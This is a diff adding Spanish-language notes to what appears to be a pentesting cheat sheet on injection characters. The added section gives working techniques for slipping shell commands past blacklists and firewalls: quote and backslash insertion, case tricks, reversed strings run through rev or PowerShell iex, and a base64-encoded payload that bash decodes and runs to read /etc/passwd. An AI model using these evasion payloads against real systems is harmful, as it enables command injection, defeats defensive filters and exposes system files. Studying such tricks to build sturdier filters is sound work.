@@ -30,3 +30,34 @@ Object Injection 	; & |
 XQuery Injection 	' ; -- /* */
 Shellcode Injection 	\x \u %u %n
 Header Injection 	\n \r\n \t %0d %0a %09
+
+##########bypass command blacklisted
+
+podemos agregar caracteres que no son tomados en cuenta en linux y windows como las comillas simples y dobles entre la morfologia del comando
+who'am'i
+who"am"i
+
+linux only:
+who$@ami
+w\ho\am\i
+
+windows:
+ who^ami
+
+podemos encontrarnos otras medidas como firewalls que nos bloqueen los comandos, con lo cual podemos utilizar diferentes técnicas de bypass:
+Case manipulation:
+WhOaMi 
+Para las terminales case-sensitive como la terminal de linux, podemos utilizar comandos como:
+$(tr "[A-Z]"%09"[a-z]"<<<"WhOaMi")
+o aplicando un reversing:
+linux:
+$(rev<<<'imaohw')
+windows:
+iex "$('imaohw'[-1..-20] -join '')"
+
+encodear un comando:
+ejemplo de comando pasado a base64:
+echo -n 'cat /etc/passwd | grep 33' | base64
+resultado: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+payload: bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+
